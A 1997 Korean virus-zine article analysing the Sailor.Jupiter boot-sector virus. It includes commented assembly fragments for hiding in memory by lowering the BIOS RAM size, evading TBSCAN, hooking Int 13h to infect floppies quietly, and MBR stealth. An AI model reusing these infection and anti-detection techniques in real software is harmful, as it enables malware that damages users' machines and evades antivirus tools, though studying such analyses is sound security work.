
  Sailor.Jupiter 완벽 분석                                     CVC #01   97/06

----------------------------------------------------------------------> Osiris

  Sailor.Jupiter 는 아주 잘 만들어진 부트 바이러스이다.
  소스는 JUPITER.ASM 을 참고 하고 여기서는 부트 바이러스의 일반적인 작동 방법
을 설명하겠다.

  부팅이란 DOS 등의 OS 를 적재하기 전에 일어나는 일이다.
  일단 플로피나 하드디스크로 부팅할때 부트섹터가 하는 일은 OS 가 있는지 검사
하고 있으면 로딩하고 없으면 에러 메시지를 출력한다.

  이런일을 하는 부트 섹터에 바이러스가 감염되는 것을 부트 바이러스라고 한다.

  쥬피터 바이러스는 부트 바이러스를 설명할때 굉장히 좋은 재료이다.

start:
        jmp     short virus_start
        nop
                                        ; 플로피 디스크의 BPB 내용이 들어감
        org     03eh

  이부분은 바이러스로 점프 하는 부분인데 3Eh 부터 시작하는 것은 이부분에 BPB
라는 값이 들어 가기 때문이다. BPB 는 디스크의 여러 정보를 담고 있는 부분이다.
  하드디스크의 경우 더더욱 이 값들이 틀려진다. 이부분은 가능하면 복구 시켜주
는 것이 좋다.

  다음에 하드디스크를 읽어서 감염 시키는 루틴이 존재한다. 그렇게 어려운것은
아니다.

no_mbr:
        mov     di,412h                 ; TBSCAN 속이기
        inc     di                      ; 0:413h
        dec     word ptr ds:[di]
        mov     ax,word ptr ds:[di]
        mov     cl,6
        shl     ax,cl                   ; 상위 영역 주소값 얻기
        mov     es,ax

  자 ! 이부분은 거의 모든 부트 바이러스들에 존재하는 부분이다.
  부트 바이러스는 DOS 이전에 존재한다. 따라서 원칙상 DOS 가 적재되면서 바
이러스는 파괴되어야 한다. 하지만, 바이러스는 0:413h 의 값을 줄여서 그곳에
숨어서 생명을 유지할 수 있다. 0:413h 의 값은 컴퓨터의 램크기이다. 이 값은
640 KB 가 한계이다. 보통 부트 바이러스에 가염되면 1 KB 이상 줄어드는 이유
는 이때문이다. DOS 가 적재되면서 0:413h 값을 참조해서 메모리를 점유한다.
이 값이 639 KB 이면 도스는 639 KB 로 인식하고 640 KB 부분을 사용하지 않는
다.

  다음에 존재하는 부분은 세그먼트를 계산하는 것이다.
  AX 에는 줄어든 램값이 들어 있다. 보통 639 일것이다.
  이 값을 세그먼트로 바꾸기 위해서는 2^6 을 곱해 주면된다.
  그러면 이 값은 바이러스가 존재할 곳의 세그먼트가 된다.

        xchg    word ptr ds:[04eh],ax   ; Int 13h 가로채기
        mov     seg13h+7c00h,ax         ; 옛날 Int 13h 세그먼트 저장
        mov     ax,offset int13h_handler; ax=바이러스 Int 13h
        xchg    word ptr ds:[04ch],ax
        mov     off13h+7c00h,ax         ; 옛날 Int 13h 오프셋 저장

  Int 13h 를 가로채는 부분이다.
  일단 바이러스가 파괴되지 않아도 된다. 그럼 어떻게 감염을 시킬 것인가 ?
  여러 방법이 있지만 Int 13h 기능을 가로채는 것이 가장 효율적이다.
  Int 13h는 디스크 입출력을 담당하는 인터럽트이다.
  디스크를 감염시킬때 아무때나 디스크 입출력을 행하면 유저는 눈치를 챌것이다.
  하지만, DIR 과 같은 명령을 내렸을때 감염시킨다면 유저는 눈치 채지 못할것이다.

        cmp     byte ptr cs:[floppymarker+7c00h],0  ; 하드 ? 플로피 ?
        jne     isharddisk              ; 0 : 플로피
        mov     cx,000eh                ; 1 : 하드디스크
        mov     dl,0
        mov     dh,1

  이 부분은 원래 부트 섹터를 읽는 것이다.
  자체 능력으로 부팅시키는 바이러스도 있지만 보통은 정상적인 부트 섹터의 도움
으로 재부팅한다.

isharddisk:
        push    013cdh                  ; put CD13 at 7c00h-2 (Int 13h)
        jmp     start-2                 ; 재부팅

  이 바이러스는 상당히 특이하게 재실행시키는데
  보통 JMP 0000:7C00h 를 하거나 스택에 0,7C00h 를 저장해서 RETF 하는 방법을
많이 사용한다.


  바이러스 인터럽트 핸들러
int13h_handler:
        cmp     cx,1                    ; 부트 섹터를 읽으려고 하나 ?
        jne     do_int_13
        cmp     dh,0                    ;
        jne     do_int_13
        cmp     dl,80h                  ; 하드 디스크 ?
        je      mbr_stealth
        cmp     dl,1                    ; 플로피의 부트 섹터를 읽으려고 하나 ?
        ja      do_int_13
        cmp     ax,201h                 ; 1 섹터 읽기 인가 ?
        je      floppy_infection
do_int_13:
        db      0EAh                    ; 원래 Int 13h 로 점프
off13h   dw      ?
seg13h   dw      ?

  Int 13h 기능이 수행될때 마다 바이러스 감염 여부를 검사한다면 그건 디스크의
입출력 속도를 현저히 떨어뜨린다.
  따라서 바이러스 제작자는 유저가 쉽게 눈치 못채게 하기 위해서 부트섹터를 읽
을때만 감염여부를 판단한다.
  이 경우 속도 저하는 거의 없으므로 유저가 쉽게 감염 사실을 눈치 채지 못한다.

  다음은 MBR 스텔스 루틴이다.
mbr_stealth:
        push    cx                      ; 주부트섹터 스텔스
        mov     cl,2
        int     13h                     ; 원래 MBR 을 대신 보여준다.
        pop     cx                      ;
        retf    2

  간단한 방법이다. 주부트섹터를 읽으려고 할때 다른 섹터를 대신 읽게 만들고
끝내 버리는 것이다.
  그럼 버퍼에는 정상적인 주부트섹터 정보가 들어간다.

  제목은 쥬피터 완벽 분석이지만 그리 자세한 설명은 못된것 같다.
  많은 소스를 보면 이해가 갈 것이다.

